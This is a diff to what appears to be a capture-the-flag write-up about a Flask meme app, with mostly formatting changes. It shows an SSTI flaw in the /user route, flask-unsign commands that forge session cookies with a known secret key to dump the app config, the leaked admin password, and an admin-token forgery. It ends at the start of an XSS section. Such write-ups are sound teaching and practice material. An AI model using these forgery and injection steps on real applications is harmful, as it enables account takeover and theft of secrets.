@@ -51,26 +51,32 @@ def token_required(f):
     return decorated
 ```
 2. SSTI
-But it's possible to forge cookies with arbitrary ids. `/user` is vulnerable to SSTI via the id field:
+ 
+It's possible to forge cookies with arbitrary ids. `/user` is vulnerable to SSTI via the id field:
 ```python
 @blueprint.route("/user", methods=["GET"])
 @token_required
 def user_info(user):
     return render_template_string(f"uid={user.id}({{{{name}}}})", name=user.name), 200
 ```
+
 Forging the token:
 ```
 flask-unsign -s -S "ilovememe" -c "{'user': '{\"id\":\"{{config}}\",\"username\":\"sebbb\",\"password\": \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"}'}"
 ```
+
 Dumped config:
 ```
 'ADMIN_USERNAME': 'admin', 'ADMIN_PASSWORD': 'hNm9Hyt#qD%E2Eh5CLeYNDASF@5X*#b$'
 ```
+
 Forging admin token:
 ```
 flask-unsign -s -S "ilovememe" -c "{'user': '{\"id\":\"0\",\"username\":\"admin\",\"password\": \"hNm9Hyt#qD%E2Eh5CLeYNDASF@5X*#b$\"}'}"
 ```
+
 3. XSS
+
 Report to admin route:
 ```python
 @blueprint.route("/list/<meme>/maketheadminlaugh", methods=["GET"])
